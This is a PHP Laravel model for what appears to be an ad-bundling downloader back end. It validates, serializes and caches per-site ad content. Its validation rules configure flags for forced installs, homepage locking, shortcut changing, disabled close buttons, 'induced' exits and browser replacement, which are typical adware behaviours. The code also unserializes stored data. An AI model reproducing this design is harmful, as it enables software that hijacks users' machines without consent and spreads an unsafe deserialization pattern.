<?php
use Illuminate\Database\Eloquent\SoftDeletingTrait;
class Ad extends Eloquent {

	use SoftDeletingTrait;
	
	// 数据表名
	protected $table = 'ad';
	
	//软删
    protected $dates = ['deleted_at'];

	// 填充白名单
	protected $fillable = [
		'siteId', 
		'downVersion', 
		'content',
		'extra'
	];

	// 验证规则
	public static $rules = array(
		'siteId' => ['required', 'integer'], 
		'downVersion' => ['required', 'integer'],
		'content' => ['required']
	);

	// 验证规则
	public static $extra_rules = array(
	    'ChkCapColor' => ['required','max:7','regex:/^#[a-fA-F0-9]{6}$/'],
	    'ChkTipColor' => ['required','max:7','regex:/^#[a-fA-F0-9]{6}$/'],
	    'onclose' => ['url', 'max:255'],
	    'adweburl1' => ['url', 'max:255'],
	    'adweburl2' => ['url', 'max:255'],
	    'bForceInstall' => ['required','in:0,1'],
	    'bChangeLnk' => ['required','in:0,1'],
	    'bLockHomePage' => ['required','in:0,1'],
	    'bOpenFolderInstall' => ['required','in:0,1'],
	    'bShowGrayChk' => ['required','in:0,1'],
	    'bHideExtend' => ['required','in:0,1'],
		'materialPlace' => ['required','in:0,1'],
		'imgPlace' => ['required','in:0,1'],
	    'bDisableClose' => ['required','in:0,1'],
	    'bDownHideToTask' => ['required','in:0,1'],
	    'bDownToDesktop' => ['required','in:0,1'],
	    'bLockTaskBar' => ['required','in:0,1'],
	    'bSwitchIELast' => ['required','in:0,1'],
	    'bInduceExit' => ['required','in:0,1'],
	    'bAlterRank' => ['required','in:0,1'],
	    'bExitInduceStart' => ['required','in:0,1'],
	    'bDebugReport' => ['required','in:0,1'],
	    'bSwitchBtnYes' => ['required','in:0,1'],
	    'bLastTaskSiteDown' => ['required','in:0,1'],
	    'bShowTaskItemText' => ['required','in:0,1'],
	    'bReplace360Browser' => ['required','in:0,1']
	);

	// 外键关联
	public function site(){
		return $this->hasOne('Site', 'id', 'siteId');
	}

	// 外键关联
	public function downer() {
		return $this->hasOne('Downer', 'id', 'downVersion');
	}

	public static function preprocess($data) {
		$item = array();
		if(intval($data['siteId']) <= 0) {
			return false;
		}
		if(intval($data['downVersion']) <= 0) {
			return false;
		}
		$item['siteId'] = intval($data['siteId']);
		$item['downVersion'] = intval($data['downVersion']);
		$item['content'][0] = unserialize(static::serializeContent($data['downVersion'], $data['content'][0]));
		$item['content'][1] = unserialize(static::serializeContent($data['downVersion'], $data['content'][1]));
		$item['content']=serialize($item['content']);
		unset($data['siteId']);
		unset($data['downVersion']);
		unset($data['content']);
		
		$validator = Validator::make($data, static::$extra_rules);
		if ($validator->fails()){
			return false;
		}
		if(isset($data['customArea']) && $data['customArea'] != '') {
			try {
				$res = simplexml_load_string($data['customArea']);
				if(false === $res) {
					return false;
				}
			} catch (Exception $e) {
				return false;
			}
		}
		$item['extra'] = serialize($data);
		return $item;
	}

	/**
	 * 把点对点备选加入备选区
	 *
	 * @param  array $content 广告内容
	 * @return array $content
	 */
	public static function addSpecAltList($content) {
		// 获取页面里的点对点备选
		$p2palts = array();
		foreach ($content as $key => $value) {
			foreach ($value as $k => $v) {
				if(isset($v['altid']) && !empty($v['altid']) && !in_array($v['altid'], $p2palts)){
					$p2palts[] = $v['altid'];
				}
			}
		}
		// 如果没有点对点备选，返回原内容
		if(empty($p2palts)){
			return $content;
		}
		// 排除备选区与点对点备选重复的条目
		foreach ($content['alternative'] as $key => $value) {
			if(!empty($value)){
				$key2 = array_search($value['id'], $p2palts);
				if($key2 !== false){
					unset($p2palts[$key2]);
				}
			}
		}
		// 添加点对点条目
		if(!empty($p2palts)){
			$materials = Material::find($p2palts)->all();
			foreach ($materials as $value) {
				$content['alternative'][] = $value->toArray();
			}
		}
		return $content;
	}

	/**
	 * JSON序列号每个条目的内容
	 * php 标准序列化整个内容
	 *
	 * @param  String  $version
	 * @param  String  $content
	 * @return String
	 */
	public static function serializeContent($version, $content) {
		$downer = Downer::find($version);
		$downVersion = unserialize($downer['content']);
		foreach ($downVersion as $k => $v) {
			foreach ($content[$k] as $key => $value) {
				if($value != ''){
					$content[$k][$key] = json_decode($value, true);
				}
			}
		}
		return serialize($content);
	}

	/**
	 * put ad into redis
	 *
	 * @param  int  $siteId 站点IE
	 * @return string | array $content 广告内容
	 */
	public static function cache($data) {
		// 验证参数合法性
		if(is_object($data)) {
			$data = $data->toArray();
		}
		if(intval($data['siteId']) <= 0 || intval($data['downVersion']) <= 0 || empty($data['content'])) {
			return false;
		}
		if(is_string($data['content'])) {
			$data['content'] = unserialize($data['content']);
		}
		if(!empty($data['extra']) && is_string($data['extra'])) {
			$data['extra'] = unserialize($data['extra']);
		}
		// 获取站点数据
		$params = array();
		try {
			$params['site'] = Site::findOrFail($data['siteId'])->toArray();
			$apiUrl=unserialize($params['site']['apiUrl']);
			$num = count($apiUrl['checkUrl']);
			if($num==0){
				$params['site']['apiUrl']=$apiUrl['url'][0];
			}else{
				for($i=0;$i<$num;$i++){
					if($apiUrl['status'][$i]==0){
						$params['site']['apiUrl']=$apiUrl['url'][$i];
						break;
					}
				}
			}
		} catch (Exception $e) {
			return false;
		}
		// 加入点对点备选
		$params['content'][0] = static::addSpecAltList($data['content'][0]);
		$params['content'][1] = static::addSpecAltList($data['content'][1]);
		// 扩展信息
		$params['extra'] = $data['extra'];
		// 缓存广告列表
		$adCache = [
			'id' => $data['siteId']
		];
		try {
			$adCache = AdCache::firstOrNew($adCache);
			$adCache->content = serialize($params); 
			return $adCache->save();
		} catch (Exception $e) {
			return false;
		}
	}

	public static function cacheRm($id) {
		// 验证参数合法性
		if(intval($id) <= 0) {
			return false;
		}
		try {
			if(!AdCache::destroy($id)) {
				return false;
			}
			return true;
		} catch (Exception $e) {
			return false;
		}

	}
}